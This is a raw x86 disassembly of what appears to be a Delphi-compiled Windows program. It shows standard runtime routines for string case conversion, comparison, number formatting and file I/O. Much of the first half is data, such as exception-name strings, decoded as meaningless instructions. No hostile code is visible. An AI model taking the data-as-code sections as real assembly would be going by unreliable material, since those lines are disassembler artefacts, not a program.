add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] ah
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
inc ebp
push ebp
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40756090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
ja r-xdata
add [ eax + eax ] cl
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax * 2 + 0x61766e49 ] cl
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ebx ] cl
inc ebp
pop edx
jb r-xdata
inc eax
rcl [ eax ] 0x76
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esi [ esi + 0x40 ]
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ 0x6e6f4345 ] cl
jbe r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + 0xd004032 ] al
inc ebp
inc ebx
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x40 ] bh
lea eax [ eax ]
and [ edi + 0x40 ] dh
jbe r-xdata
jbe r-xdata
inc ebp
dec edi
jbe r-xdata
sub [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax + 0x9004032 ] al
push 0x4076
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 ] dh
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] cl
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ esi ] cl
inc ebp
push ebx
je r-xdata
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
outsb
lea eax [ eax ]
fdiv [ edi + 0x40 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ edx + esi + 0x40 ] al
add [ eax + 0xc004032 ] al
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
mov eax eax
call sub_40b919
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] cl
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
ja r-xdata
inc ebp
jb r-xdata
jb r-xdata
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ eax ] ah
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ edi + 0x40 ]
outsd
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
inc eax
rol [ ecx + edi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0xc40b939
add [ eax ] al
add al dl
jo r-xdata
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
js r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
js r-xdata
insb
nop
xor al 0x78
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
sar [ edi + esi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ eax ] al
inc ebx
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x40 ] bh
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
movsb [ edi ] [ esi ]
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 + 0x40 ] al
outsd
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 + 0xc0040 ] ah
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add [ eax + eax ] cl
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] dl
inc ebp
inc ecx
add [ eax ] al
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ 0x72615645 ] cl
imul esp [ ecx + 0x6e ] 0x72724574
outsd
jb r-xdata
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
inc ebp
push eax
jb r-xdata
nop
js r-xdata
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] cl
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] dl
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x7a
inc eax
add [ eax + eax ] cl
inc ebp
jb r-xdata
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + 0xe004032 ] al
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
inc ebp
inc ebx
outsd
outsb
je r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + 0x9004032 ] al
add [ eax ] al
add [ eax + 0x72 ] cl
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004078 ] dl
loopne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
push 0x4400407b
add [ eax ] al
imul ebp [ edi + 0x6e ] 0x407acc90
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add al al
xor al 0x40
add ah cl
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 + 0xc0040 ] dh
xor [ edx ] 0x40
add [ esi ] cl
pop esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 + 0x40 ] bl
add [ eax ] dl
add [ eax ] al
add al dl
jo r-xdata
jb r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407bbc3f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
jl r-xdata
jb r-xdata
add [ eax - 0x3fffbff0 ] dh
add [ eax + 0x7b ] ch
inc eax
add [ eax + eax ] al
je r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + 0x8004032 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] cl
jae r-xdata
adc [ ebp + 0x41 ] al
add [ edx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jpe r-xdata
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
add [ edx + esi + 0x40 ] al
add al bl
jpo r-xdata
xor al 0x40
add ah cl
xor al 0x40
add al dl
add eax 0xffffffd4
jmp sub_40cf9c
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
or ah 0x40
add [ ebx ] dl
insb
jae r-xdata
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
iretd
je r-xdata
add [ esi + ecx * 8 ] ah
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 + 0x40 ] al
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x34c00040 ] ah
inc eax
add ah dh
pop eax
inc eax
add [ eax ] al
pop ecx
inc eax
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] dl
pop ecx
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl al 0x7a
inc eax
add [ ecx ] dl
add ebp [ esi ]
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
enter 0x4034 0x0
sub [ edx ] dh
inc eax
push ebp
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ esi ] cl
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ edx + edi * 2 + 0x40 ] dh
call sub_40b888
call sub_403a44
pop edi
pop esi
pop ebx
retn
push edx
popad
inc ebp
js r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + 0x130040cc ] al
je r-xdata
insb
jne r-xdata
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
mov eax ebx
call sub_4026cc
mov esi eax
mov eax esi
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] dl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
inc eax
sar bh 0xff
mov edx ebx
call sub_402ca4
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
sub_407c6c
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407ca0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
pop edi
pop esi
pop ebx
retn
sub_407cc4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026cc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402ca4
mov eax esi
pop esi
pop ebx
retn
sub_407ce4
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026ec
call ebx
pop ebx
retn
sub_407d10
push ebx
mov ebx eax
mov eax 0xc
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407ce4
pop ebx
retn
sub_407d48
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042c8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404654
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407d84
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042c8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404654
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407dc0
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407df0
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407e10
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407e64
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407e10
test eax eax
jne r-xdata
sub_407e88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4042c8
push eax
mov eax esi
call sub_4044c8
push eax
mov eax ebx
call sub_4042c8
push eax
mov eax ebx
call sub_4044c8
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407ec0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4042c8
push eax
mov eax esi
call sub_4044c8
push eax
mov eax ebx
call sub_4042c8
push eax
mov eax ebx
call sub_4044c8
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407f10
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407f30
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4042c8
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_404008
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404528
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407f80
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4042c8
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_4042c8
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407fe4
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407ffa
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407ffa
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407ffa
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408030
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407fe4
mov edx esi
pop eax
call sub_4040f8
add esp 0x10
pop esi
retn
sub_408050
or cl cl
jne sub_408084
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_408084
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_408084
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_408084
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40811c
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_408050
mov edx esi
pop eax
call sub_4040f8
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_408144
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407fe4
mov edx esi
pop eax
call sub_4040f8
add esp 0x20
pop esi
retn
xor edx edx
sub_40816c
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402cc4
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407ca0
sub_4081c0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402cc4
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4081e0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404dd0
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408200
mov eax [ rw-data ]
call sub_405000
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_405000
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051bc
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40405c
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051bc
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40405c
sub_408290
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407ef8
test al al
je r-xdata
sub_4082cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40948c
mov edx eax
test dl dl
je r-xdata
call sub_408200
push ebp
mov eax [ rw-data ]
call sub_405008
mov edx eax
mov eax [ rw-data ]
call sub_408290
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_405008
mov edx eax
mov eax [ rw-data ]
call sub_408290
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_408368
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40405c
call sub_408200
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_40405c
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_40405c
jmp r-xdata
pop esi
pop ebx
retn
sub_4083b4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4044c8
push eax
call CreateFileA
sub_40840c
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_4044c8
push eax
call CreateFileA
pop ebx
retn
sub_408438
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408464
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408490
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
